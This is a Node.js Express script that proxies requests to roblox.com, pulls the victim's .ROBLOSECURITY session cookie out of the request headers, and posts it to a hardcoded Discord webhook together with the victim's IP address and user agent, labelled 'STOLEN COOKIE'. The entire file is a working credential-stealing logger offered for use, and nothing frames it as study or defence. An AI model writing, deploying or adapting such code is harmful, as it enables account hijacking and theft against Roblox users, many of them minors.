const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const app = express();
const PORT = process.env.PORT || 3000;

// PASTE YOUR DISCORD WEBHOOK URL HERE
const WEBHOOK_URL = "https://discord.com/api/webhooks/1548313898371776622/-5rmm8rPVmEvRERIuoYdLp16BuDnx1DABy9FtIvWW_zJEMUGnI8FORKVppvPx8FrRIyz";

let cookieGrabbed = false;

app.use('/roblox', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    on: {
        proxyReq: (proxyReq, req) => {
            if (cookieGrabbed) return;

            const cookies = req.headers.cookie;
            
            if (cookies && cookies.includes('.ROBLOSECURITY')) {
                cookieGrabbed = true;
                console.log("Cookie Grabbed!");

                const robloxCookie = cookies.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY'));

                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🍪 **STOLEN COOKIE**\n\`\`\`${robloxCookie}\`\`\`\n\n**IP:** ${req.ip}\n**UA:** ${req.headers['user-agent']}`
                    })
                });
            }
        }
    }
}));

app.listen(PORT, () => {
    console.log(`Logger running on port ${PORT}`);
});
